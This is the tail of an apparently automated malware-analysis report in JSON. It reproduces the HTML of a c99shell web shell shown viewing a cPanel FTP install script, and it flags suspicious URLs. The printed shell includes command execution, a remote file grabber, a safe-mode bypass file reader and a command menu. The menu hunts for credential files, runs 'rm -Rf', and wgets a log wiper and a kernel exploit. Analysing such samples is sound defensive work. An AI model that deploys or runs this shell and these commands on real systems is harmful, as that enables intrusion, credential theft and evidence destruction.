            "        rename $cert_file, $cert_file . '.preinstall';",
            "    }",
            "# Install new RPM",
            "system 'rpm', '-Uvh', '--nodeps', '--force', $file;",
            "# Restore certs",
            "foreach my $cert_file (@ftp_cert_files) {",
            "    if ( -e $cert_file . '.preinstall' ) {",
            "        rename $cert_file . '.preinstall', $cert_file;",
            "    }",
            "if ( $pkg ne 'proftpd' ) {",
            "    if ( !-e '/usr/local/cpanel/bin/pureauth' ) {",
            "        warn '/usr/local/cpanel/bin/pureauth IS MISSING';",
            "    }",
            "    system( 'cp', '-fv', '/usr/local/cpanel/bin/pureauth', '/usr/sbin/pureauth' );",
            "    system( 'cp', '-fv', '/usr/local/cpanel/bin/pureauth', '/usr/local/sbin/pureauth' );",
            "    chmod( 0700, '/usr/sbin/pureauth' );",
            "    chmod( 0700, '/usr/local/sbin/pureauth' );",
            "$ENV{'RPMINSTALL'} = 0;",
            "chdir '/';",
            "system 'rm', '-rf', '/home/ftpup-install';",
            "if ( !-d '/etc/proftpd' ) {",
            "    if ( -e '/etc/proftpd' ) {",
            "        rename '/etc/proftpd', '/etc/proftpd.ftpup.back';",
            "    }",
            "    mkdir '/etc/proftpd', 0751;",
            "else {",
            "    chmod 0751, '/etc/proftpd';",
            "if ( -x '/scripts/postftpup' ) {",
            "    system '/scripts/postftpup';",
            "if ( -x '/scripts/postftpinstall' ) {",
            "    system '/scripts/postftpinstall';",
            "setupftpconf();",
            "resftp();",
            "print &quot;Install Complete\\n&quot;;",
            "sub buildrpm {",
            "    my $syspkgobj = Cpanel::SysPkgs-&gt;new();",
            "    if ( !$syspkgobj ) {",
            "        die &quot;Unable to create system package object. Fatal error.&quot;;",
            "    }",
            "    my @pkgs = ( &quot;rpm&quot;, &quot;rpm-build&quot;, &quot;db-devel&quot;, &quot;gdbm-devel&quot;, &quot;db1-devel&quot;, &quot;compat-db&quot;, &quot;ndbm-devel&quot; );",
            "    $syspkgobj-&gt;install( 'pkglist' =&gt; \\@pkgs );",
            "    my $rpm = 'rpm';",
            "    if ( -e &quot;/usr/bin/rpmbuild&quot; ) { $rpm = '/usr/bin/rpmbuild'; }",
            "    $url = &quot;http://diff.cpanel.net/ftpinstall/${basedir}/src/${pkg}-${ftpver}-${buildnum}${bsv}.src.rpm&quot;;",
            "    $httpClient-&gt;download( $url, &quot;${pkg}.src.rpm&quot; );",
            "    open( RNULL, &quot;&lt;&quot;, &quot;/dev/null&quot; );",
            "    print &quot;Building RPM...&quot;;",
            "    open( RPM, &quot;&gt;&quot;, &quot;rpmbuildlog&quot; );",
            "    $pid = IPC::Open3::open3( &quot;&lt;&amp;RNULL&quot;, &quot;&gt;&amp;RPM&quot;, &quot;&gt;&amp;RPM&quot;, &quot;$rpm&quot;, &quot;--rebuild&quot;, &quot;${pkg}.src.rpm&quot; );",
            "    while ( waitpid( $pid, 1 ) &lt;= 0 ) {",
            "        print &quot;.&quot;;",
            "        sleep(1);",
            "    }",
            "    close(RPM);",
            "    close(RNULL);",
            "    print &quot;Done\\n&quot;;",
            "    open( RPM, &quot;&lt;&quot;, &quot;rpmbuildlog&quot; );",
            "    while (&lt;RPM&gt;) {",
            "        if (/^Wrote: (\\S+)/) {",
            "            $file = $1;",
            "            if ( $file =~ /.(64|86)\\.rpm/ ) {",
            "                Cpanel::RpmStor::rpmstor($file);",
            "                return ($file);",
            "            }",
            "        }",
            "    }",
            "    close(RPM);",
            "    open( RPM, &quot;&lt;&quot;, &quot;rpmbuildlog&quot; );",
            "    seek( RPM, -2048, &amp;Fcntl::SEEK_END );",
            "    while (&lt;RPM&gt;) {",
            "        print &quot;\\t&quot; . $_;",
            "    }",
            "    close(RPM);",
            "    die &quot;Failed to build rpm&quot;;",
            "sub setupftpconf {",
            "    if (   ( -f &quot;/var/log/xferlog&quot; || !-e &quot;/var/log/xferlog&quot; )",
            "        &amp;&amp; !-l &quot;/var/log/xferlog&quot;",
            "        &amp;&amp; -e &quot;/usr/local/apache/domlogs/ftpxferlog&quot; ) {",
            "        open( OLDX, &quot;&lt;&quot;,  &quot;/var/log/xferlog&quot; );",
            "        open( NEWX, &quot;&gt;&gt;&quot;, &quot;/usr/local/apache/domlogs/ftpxferlog&quot; );",
            "        while (&lt;OLDX&gt;) {",
            "            print NEWX;",
            "        }",
            "        close(OLDX);",
            "        close(NEWX);",
            "        unlink(&quot;/var/log/xferlog&quot;);",
            "        symlink( &quot;../../usr/local/apache/domlogs/ftpxferlog&quot;, &quot;/var/log/xferlog&quot; );",
            "        print &quot;Ftp Log Relocated!\\n&quot;;",
            "    }",
            "    if ( $pkg eq &quot;proftpd&quot; ) {",
            "        my $conf = '/etc/proftpd.conf';",
            "        if ( $system =~ /freebsd/i ) {",
            "            $conf = '/usr/local/etc/proftpd.conf';",
            "        }",
            "        system(&quot;/scripts/fixproftpdconf&quot;);",
            "        system(&quot;/usr/local/cpanel/bin/proftpdvhosts&quot;);",
            "        system(&quot;/scripts/rebuildproftpd &gt;&gt; $conf&quot;);",
            "        system(&quot;/usr/local/cpanel/bin/proftpdtls&quot;);",
            "    }",
            "    my $conf_obj = Cpanel::FtpUtils::Config-&gt;new();",
            "    my $conf_hr  = $conf_obj-&gt;get_config(1);",
            "    $conf_obj-&gt;save_datastore($conf_hr);",
            "    $conf_obj-&gt;update_config($conf_hr);",
            "sub resftp {",
            "    system( &quot;/scripts/restartsrv&quot;, $pkg );",
            "sub resetbsdpkgcache {",
            "    my ( undef, undef, undef, $mday, $mon, $year, undef, undef, undef ) = localtime($now);",
            "    $year += 1900;",
            "    $mon++;",
            "    unlink(&quot;/root/.cpbsdpkgs/${mon}-${mday}-${year}.PKGDATE&quot;);",
            "    unlink(&quot;/root/.cpbsdpkgs/${mon}-${mday}-${year}.PKGINFO&quot;);",
            "    unlink('/root/.cpbsdpkgs/pkg_version');",
            "# One time fixup?",
            "sub check_proftpd_conf {",
            "    if ( $pkg eq &quot;proftpd&quot; ) {",
            "        my $conf = '/etc/proftpd.conf';",
            "        if ( $system =~ /freebsd/i ) {",
            "            $conf = '/usr/local/etc/proftpd.conf';",
            "        }",
            "        my $size = ( stat($conf) )[7];",
            "        if ( $size &lt; 30 ) {",
            "            setupftpconf();",
            "            resftp();",
            "        }",
            "    }",
            "</textarea></form>",
            "</td></tr></table><a bookmark=\"minipanel\"><br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr><td width=\"100%\" height=\"1\" valign=\"top\"><center><form action=\"?\"><input type=hidden name=act value=\"cmd\"><br/><b>CMD:</b> <input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"cmd\" size=\"50\" value=\"\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=search&d=%2Fscripts%2F\"><b>Search</b></a> ::</b><form method=\"POST\"><input type=hidden name=act value=\"search\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"search_name\" size=\"29\" value=\"(.*)\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>",
            " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"?act=upload&d=%2Fscripts%2F\"><b>Upload</b></a> ::</b><form method=\"POST\" ENCTYPE=\"multipart/form-data\"><input type=hidden name=act value=\"upload\"><input type=\"file\" name=\"uploadfile\"><input type=hidden name=\"miniform\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Upload\"><br><font color=red>[ Read-Only ]</font></form></center></td>",
            "</tr>",
            "</table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Remote File Grabber ::</b><br/><br/><form action=\"?grab=true\"   method=\"post\">File Url:<input name=\"from\"> New File Name: <input name=\"to\"> <input type=\"submit\" value=\"Grab!\"></center></td></tr></table>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make Dir ::<p><form action=\"?\"><input type=hidden name=act value=\"mkdir\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkdir\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Make File ::</b><form method=\"POST\"><input type=hidden name=act value=\"mkfile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"mkfile\" size=\"50\" value=\"/scripts/\"><input type=hidden name=\"ft\" value=\"edit\">&nbsp;<input type=submit value=\"Create\"><br><font color=red>[ Read-Only ]</font></form></center></td></tr></table>",
            "<br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\"><br/><b>:: Useful Commands ::</b>",
            "    </div>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "        <input type=hidden name=act value=\"cmd\">",
            "        <input type=hidden name=\"d\" value=\"/scripts/\">",
            " <SELECT NAME=\"cmd\">",
            "           <OPTION VALUE=\"tar -cvf NEWTAR!!.tar -c /home/chsclair/public_html/td-admin/modules/gallery_management/images",
            "\">Tar your current directory. (Only works if your dir. is writable)",
            "           <OPTION VALUE=\"pwd\">List your current directory",
            "           <OPTION VALUE=\"ls -lia\">List you current directory's files, folders, & permissions",
            "           <OPTION VALUE=\"find / -type f -perm -04000 -ls\">find suid files",
            "           <OPTION VALUE=\"find . -type f -perm -04000 -ls\">find suid files in current dir",
            "           <OPTION VALUE=\"find / -type f -perm -02000 -ls\">find sgid files",
            "           <OPTION VALUE=\"find . -type f -perm -02000 -ls\">find sgid files in current dir",
            "           <OPTION VALUE=\"uname -a\">Kernel version",
            "           <OPTION VALUE=\"w\">Logged in users",
            "           <OPTION VALUE=\"lastlog\">Last users to connect",
            "           <OPTION VALUE=\"find /bin /usr/bin /usr/local/bin /sbin /usr/sbin /usr/local/sbin -perm -4000 2> /dev/null\">Suid bins",
            "           <OPTION VALUE=\"cut -d: -f1,2,3 /etc/passwd | grep ::\">Users without passwords",
            "                    <OPTION VALUE=\"find /etc/ -type f -perm -o+w 2> /dev/null\">Is /etc/ writable?",
            "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
            "                    <OPTION VALUE=\"cat /proc/version /proc/cpuinfo\">CpuInfo",
            "                    <OPTION VALUE=\"netstat -atup | grep IST\">Open ports",
            "                    <OPTION VALUE=\"locate gcc\">Is gcc installed?",
            "\t\t    <OPTION VALUE=\"find / -type f -name config.inc.php\">find config.inc.php files",
            "<OPTION VALUE=\"find . -type f -name config.inc.php\">find config.inc.php files in current dir",
            "<OPTION VALUE=\"find / -type f -name \"config*\">find config* files",
            "<OPTION VALUE=\"find . -type f -name \"config*\">find config* files in current dir",
            "<OPTION VALUE=\"find / -type f -perm -2 -ls\">find all writable files",
            "<OPTION VALUE=\"find . -type f -perm -2 -ls\">find all writable files in current dir",
            "<OPTION VALUE=\"find /  -type d -perm -2 -ls\">find all writable directories",
            "<OPTION VALUE=\"find . -type d -perm -2 -ls\">find all writable directories in current dir",
            "<OPTION VALUE=\"find / -perm -2 -ls\">find all writable directories and files",
            "<OPTION VALUE=\"find . -perm -2 -ls\">find all writable directories and files in current dir",
            "<OPTION VALUE=\"find / -type f -name service.pwd\">find all service.pwd files",
            "<OPTION VALUE=\"find . -type f -name service.pwd\">find service.pwd files in current dir'",
            "<OPTION VALUE=\"find / -type f -name .htpasswd\">find all .htpasswd files",
            "<OPTION VALUE=\"find . -type f -name .htpasswd\">find .htpasswd files in current dir",
            "<OPTION VALUE=\"find / -type f -name .bash_history\">find all .bash_history files",
            "<OPTION VALUE=\"find . -type f -name .bash_history\">find .bash_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .mysql_history\">find all .mysql_history files",
            "<OPTION VALUE=\"find . -type f -name .mysql_history\">find .mysql_history files in current dir",
            "<OPTION VALUE=\"find / -type f -name .fetchmailrc\">find all .fetchmailrc files",
            "<OPTION VALUE=\"find . -type f -name .fetchmailrc\">find .fetchmailrc files in current dir",
            "<OPTION VALUE=\"lsattr -va\">list file attributes on a Linux second extended file system",
            "                    <OPTION VALUE=\"rm -Rf\">Format this box.",
            "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
            "                    <OPTION VALUE=\"gcc zap2.c -o zap2\">WIPELOGS PT2",
            "                    <OPTION VALUE=\"./zap2\">WIPELOGS PT3",
            "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)",
            "                    <OPTION VALUE=\"./k3 1\">Kernel attack (Krad.c) PT2 (L1)",
            "                    <OPTION VALUE=\"./k3 2\">Kernel attack (Krad.c) PT2 (L2)",
            "                    <OPTION VALUE=\"./k3 3\">Kernel attack (Krad.c) PT2 (L3)",
            "                    <OPTION VALUE=\"./k3 4\">Kernel attack (Krad.c) PT2 (L4)",
            "                    <OPTION VALUE=\"./k3 5\">Kernel attack (Krad.c) PT2 (L5)",
            "                  </SELECT>",
            "        <input type=hidden name=\"cmd_txt\" value=\"1\">",
            "        &nbsp;",
            "        <input type=submit name=submit value=\"Execute\"></div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "  <center><br/><b>:: Kernel Info :: </b>",
            "<form action=http://google.com/search name=f><input type=hidden name=client value=\"firefox-a\"><input type=hidden name=rls value=\"org.mozilla:en-US:official_s\"><input type=hidden name=hl value=en><input id=sf maxLength=256 name=q value=\"Linux wc3.titleworkspace.com 2.6.18-194.32.1.el5 #1 SMP Wed Jan 5 17:53:09",
            "EST 2011 i686\" size=30>&nbsp;<input type=submit value=\"Search\" name=btnG></form>",
            "</center>",
            "    </td>",
            "</tr></TABLE><br>",
            "<TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"116\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1>",
            "<tr>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "    <div align=\"center\">Php Safe-Mode Bypass (Read Files)",
            "    </div><br>",
            "    <form action=\"?\">",
            "      <div align=\"center\">",
            "      File: <input type=\"text\" name=\"file\" method=\"get\"> <input type=\"submit\" value=\"Read File\"><br><br> eg: /etc/passwd<br>",
            "      ",
            "      ",
            "      ",
            "           ",
            "      ",
            "      ",
            "      \t",
            "          <br>",
            "      </div>",
            "    </form>",
            "    </td>",
            "  <td width=\"50%\" height=\"83\" valign=\"top\"><center>",
            "   <center>Php Safe-Mode Bypass (List Directories):     <form action=\"?\">",
            "      <div align=\"center\"><br>",
            "      Dir: <input type=\"text\" name=\"directory\" method=\"get\"> <input type=\"submit\" value=\"List Directory\"><br><br> eg: /etc/<br>",
            "    </form></center>",
            "    </td>",
            "</tr></TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height=\"1\" width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go Dir ::</b><form action=\"?\"><input type=hidden name=act value=\"ls\"><input type=\"text\" name=\"d\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Go File ::</b><form action=\"?\"><input type=hidden name=act value=\"gofile\"><input type=hidden name=\"d\" value=\"/scripts/\"><input type=\"text\" name=\"f\" size=\"50\" value=\"/scripts/\">&nbsp;<input type=submit value=\"Go\"></form></center></td></tr></table>",
            "</td>",
            "</tr>",
            "</TABLE>",
            "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width=\"990\" height=\"1\" valign=\"top\"><p align=\"center\"><b>--[ c99shell modded by synsta. | Page generation time: 0.0121 ]--</p></td></tr></table>",
            "<br/></body></html>"
        ],
        "file": {},
        "fuzzing": {
            "Possible connections": [
                "                    <OPTION VALUE=\"which wget curl w3m lynx\">We got downloaders? :D",
                "                    <OPTION VALUE=\"wget http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c\">WIPELOGS PT1 (If wget installed)",
                "                    <OPTION VALUE=\"wget http://ftp.powernet.com.tr/supermail/debug/k3\">Kernel attack (Krad.c) PT1 (If wget installed)"
            ]
        },
        "ip": [],
        "url": [
            "http://cpanel.net",
            "http://ftp.powernet.com.tr/supermail/debug/k3",
            "http://diff.cpanel.net/ftpinstall/",
            "http://www.packetstormsecurity.org/UNIX/penetration/log-wipers/zap2.c",
            "http://google.com/search"
        ]
    },
    "time": "0:00:00.461770",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
